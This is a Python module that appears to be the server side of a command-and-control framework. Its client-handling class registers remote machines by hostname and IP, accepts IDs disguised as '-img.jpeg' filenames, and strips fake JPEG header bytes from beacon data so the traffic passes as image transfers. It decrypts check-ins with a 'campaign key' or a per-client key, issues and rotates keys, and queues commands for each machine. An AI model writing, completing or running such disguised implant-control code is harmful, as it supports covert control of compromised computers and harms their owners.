import os
import base64
import logging
from datetime import datetime
import json
import re

logger = logging.getLogger(__name__)

class ClientHelper:
    """Handles client identification, verification, and command management"""
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
    
    def identify_client_from_body(self, client_ip, client_id_from_body, system_info_raw=None):
        """
        Identify a client based on client ID provided in request body
        
        Args:
            client_ip: IP address of the client
            client_id_from_body: Client ID extracted from request body
            system_info_raw: Raw system info data (could be encrypted)
            
        Returns:
            tuple: (client_id, system_info, newly_identified, first_contact)
        """
        system_info = {}
        newly_identified = False
        first_contact = False
        
        # Use the client ID from the body if provided
        client_id = client_id_from_body
        
        # Check if client_id follows the expected format (XXXXX-img.jpeg)
        if client_id and not client_id.upper().endswith("-IMG.JPEG"):
            logger.warning(f"Client ID {client_id} doesn't follow expected format, may need verification")
        
        # If no client ID was provided, use IP as fallback
        if not client_id:
            client_id = client_ip
            logger.warning(f"No client ID provided, using IP address {client_ip} as identifier")
        
        # Process system info if available
        if system_info_raw:
            try:
                # Check for and remove JPEG headers if present
                if isinstance(system_info_raw, str):
                    # Strip JPEG header prefixes (exact match only to avoid breaking the data)
                    if system_info_raw.startswith("0xFFD8FF"):
                        system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
                        logger.info(f"Removed JPEG header prefix '0xFFD8FF' from data")
                    elif system_info_raw.startswith("FFD8FF"):
                        system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
                        logger.info(f"Removed JPEG header prefix 'FFD8FF' from data")
                
                # Try to decrypt the system info if it doesn't look like JSON
                system_info_json = system_info_raw
                
                if not isinstance(system_info_raw, dict) and not (isinstance(system_info_raw, str) and system_info_raw.startswith('{')):
                    try:
                        # Try with client-specific key if available
                        if client_id and self._has_unique_key(client_id):
                            system_info_json = self.crypto_helper.decrypt(system_info_raw, client_id)
                        else:
                            # Fall back to campaign key
                            system_info_json = self.crypto_helper.decrypt(system_info_raw)
                    except Exception as e:
                        logger.warning(f"Could not decrypt system info: {e}")
                        # Try to use it as-is if decryption fails
                
                # Parse the system info JSON
                try:
                    if isinstance(system_info_json, str):
                        system_info_obj = json.loads(system_info_json)
                    else:
                        system_info_obj = system_info_json
                        
                    # Extract properties from system info
                    hostname = system_info_obj.get('Hostname', 'Unknown')
                    ip = system_info_obj.get('IP', client_ip)
                    system_info = system_info_obj
                    
                    logger.info(f"Extracted system info - Hostname: {hostname}, IP: {ip}")
                    
                except Exception as e:
                    logger.error(f"Error parsing system info: {str(e)}")
                    # Keep client_id but use minimal system info
                    system_info = {"Hostname": "Unknown", "IP": client_ip}
                
                # Check if this is a known client
                if client_id in self.client_manager.get_clients_info():
                    logger.info(f"Recognized client by ID {client_id} from {client_ip}")
                    
                    # Check if this client needs a key
                    if not self._has_unique_key(client_id):
                        first_contact = True
                else:
                    newly_identified = True
                    first_contact = True
                    logger.info(f"New client with ID {client_id} from {client_ip}")
            except Exception as e:
                logger.error(f"Error processing system information: {str(e)}")
                # Use client_id from body but minimal system info
                system_info = {"Hostname": "Unknown", "IP": client_ip}
        else:
            # No system info provided, use minimal info
            system_info = {"Hostname": "Unknown", "IP": client_ip}
        
        # Register or update the client with the simplified info
        self.client_manager.add_client(
            ip=client_ip,
            hostname=system_info.get("Hostname", "Unknown"),
            system_info=system_info,
            client_id=client_id
        )
        
        return client_id, system_info, newly_identified, first_contact
    
    def verify_client(self, client_id, system_info):
        """
        Verify client identity - simplified for the new ID format
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        # For our simplified approach, consider clients verified after first contact
        is_verified = True
        confidence = 100.0  # High confidence
        warnings = []
        
        # Update client verification status
        self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
        
        # Check if client needs key rotation
        has_unique_key = self._has_unique_key(client_id)
        
        # Check for manual key rotation request
        requested_key_rotation = any(
            cmd.get('command_type') == 'key_rotation' 
            for cmd in self.client_manager.get_pending_commands(client_id)
        )
        
        # Always issue a unique key on first connection
        needs_key_rotation = (not has_unique_key or requested_key_rotation)
        
        # Log key rotation status
        if requested_key_rotation:
            logger.info(f"Manual key rotation requested for client {client_id}")
        elif not has_unique_key:
            logger.info(f"First contact with client {client_id} - key issuance needed")
        
        # Register client information for future reference if client_verifier exists
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            self.server.client_verifier.register_client(client_id, system_info)
        
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
        else:
            # Fallback to direct check
            return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
    
    def prepare_key_issuance(self, client_id):
        """
        Prepare a key issuance for a new client
        
        Returns:
            dict: Key issuance command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key issuance command
        key_issuance_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_issuance",
            "args": base64_key
        }
        
        logger.info(f"Key issuance command created for client {client_id}")
        
        return key_issuance_command
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def organize_commands(self, client_id, include_key_rotation=False, first_contact=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier
            include_key_rotation: Whether to include key rotation command
            first_contact: Whether this is the first contact from client
            
        Returns:
            tuple: (commands, has_key_operation)
        """
        commands = []
        has_key_operation = False
        
        # For first contact, only send a key issuance command
        if first_contact:
            key_issuance_command = self.prepare_key_issuance(client_id)
            commands.append(key_issuance_command)
            has_key_operation = True
            return commands, has_key_operation
        
        # Get pending commands for established clients
        commands = self.client_manager.get_pending_commands(client_id)
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_operation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_operation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_operation = True
        
        return commands, has_key_operation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands if cmd.get('command_type') != 'key_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )